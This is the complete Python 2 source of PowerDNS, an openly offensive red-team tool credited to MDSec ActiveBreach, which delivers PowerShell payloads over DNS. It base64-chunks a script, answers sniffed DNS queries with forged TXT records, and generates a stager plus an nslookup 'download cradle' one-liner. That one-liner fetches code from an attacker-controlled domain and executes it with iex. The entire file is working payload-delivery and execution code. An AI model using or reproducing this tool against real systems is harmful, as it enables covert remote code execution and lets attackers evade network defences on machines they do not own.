#! /usr/bin/env python2

# PowerDNS: A tool for performing Powershell DNS Delivery
# Author: Dominic Chell <dominic@mdsec.co.uk>
# MDSec ActiveBreach Team
#
# Some improvements made with <3 by @byt3bl33d3r
#

import sys
import os
import base64
import signal
import argparse
from argparse import RawTextHelpFormatter
from scapy.all import *

banner = """
 ___                        ___  _ _  ___  
| . \ ___  _ _ _  ___  _ _ | . \| \ |/ __> 
|  _// . \| | | |/ ._>| '_>| | ||   |\__ \ 
|_|  \___/|__/_/ \___.|_|  |___/|_\_|<___/ 

      @domchell, MDSec ActiveBreach

                v1.0

"""


def validate_args():

    parser = argparse.ArgumentParser(description=banner, formatter_class=RawTextHelpFormatter, version=1.0)
    parser.add_argument("--file", metavar="<file>", dest="file", default=None, help="powershell file to serve")
    parser.add_argument("--domain", metavar="<domain>", dest="domain", default=None, help="domain with auth NS record")
    parser.add_argument("--timeout", metavar="<timeout>", dest="timeout", default=5, help='number of seconds to wait for a reply to a request(default: 5 seconds)')
    parser.add_argument("--interface", metavar="<interface>", dest="interface", default="eth0", help="interface to bind to (default: eth0)")
    args = parser.parse_args()

    print banner

    if os.geteuid() != 0:
        print "\033[1;34m[*]\033[0;0m PowerDNS: Script needs to be run with root privileges"
        sys.exit(-1)

    elif not args.file or not args.domain:
        print "\033[1;34m[*]\033[0;0m PowerDNS: The --file and --domain arguments are required"
        sys.exit(-1)

    elif args.file:
        if not os.path.exists(os.path.expanduser(args.file)):
            print "\033[1;34m[*]\033[0;0m PowerDNS: Specified path to file is invalid"
            sys.exit(-1)

    args.file = os.path.expanduser(args.file)

    return args


def signal_handler(signal, frame):
        print '\033[1;34m[*] PowerDNS:\033[0;0m Exiting'
        sys.exit(0)


def base64_file(file):
    try:
        with open(file, "rb") as powershell_file:
            encoded_string = base64.b64encode(powershell_file.read())
        return encoded_string
    except:
        print "\033[1;34m[*] PowerDNS:\033[0;0m Error opening file"
        sys.exit(-1)


def get_chunks(file):
    tmp_chunks = []
    encoded_file = base64_file(file)
    for i in range(0, len(encoded_file), 250):
        tmp_chunks.append(encoded_file[i:i + 250])
    return tmp_chunks


def powerdnsHandler(data):
    if data.haslayer(UDP) and data.haslayer(DNS) and data.haslayer(DNSQR):
        global chunks
        ip = data.getlayer(IP)
        udp = data.getlayer(UDP)
        dns = data.getlayer(DNS)
        dnsqr = data.getlayer(DNSQR)

        print '\033[1;34m[*] PowerDNS:\033[0;0m Received DNS Query for {} from {}'.format(dnsqr.qname, ip.src)

        if len(dnsqr.qname) != 0 and dnsqr.qtype == 16:
            try:
                response = chunks[int(dnsqr.qname.split('.')[0])]
            except:
                return
            rdata = response
            rcode = 0
            dn = domain
            an = (None, DNSRR(rrname=dnsqr.qname, type='TXT', rdata=rdata, ttl=1))[rcode == 0]
            ns = DNSRR(rrname=dnsqr.qname, type="NS", ttl=1, rdata="ns1." + dn)
            forged = IP(id=ip.id, src=ip.dst, dst=ip.src) / UDP(sport=udp.dport, dport=udp.sport) / DNS(id=dns.id, qr=1, rd=1, ra=1, rcode=rcode, qd=dnsqr, an=an, ns=ns)
            send(forged, verbose=0, iface=interface)


if __name__ == '__main__':

    chunks = []
    try:
        args = validate_args()
        signal.signal(signal.SIGINT, signal_handler)
        chunks = get_chunks(args.file)
        domain = args.domain
        timeout = args.timeout
        interface = args.interface
        STAGER_CMD = 'for ($i=1;$i -le {};$i++){{$b64+=iex(nslookup -q=txt -timeout={} "$i.")[-1]}};iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(($b64))))'.format(str(len(chunks)), timeout, domain)

        print "\033[1;34m[*] PowerDNS:\033[0;0m Splitting {} in to {} chunk(s)".format(args.file, str(len(chunks)))
        chunks.insert(0, STAGER_CMD)
        print "\033[1;34m[*] PowerDNS:\033[0;0m Use the following download cradle:\n\033[1;34m[*] PowerDNS:\033[0;0m powershell \"powershell (nslookup -q=txt -timeout={} 0.{})[-1]\"".format(timeout, domain)

        while True:
            mSniff = sniff(filter="udp dst port 53", iface=interface, prn=powerdnsHandler)
    except Exception as e:
        print "\033[1;34m[*] PowerDNS:\033[0;0m Error when binding to interface: {}".format(e)
        sys.exit(-1)
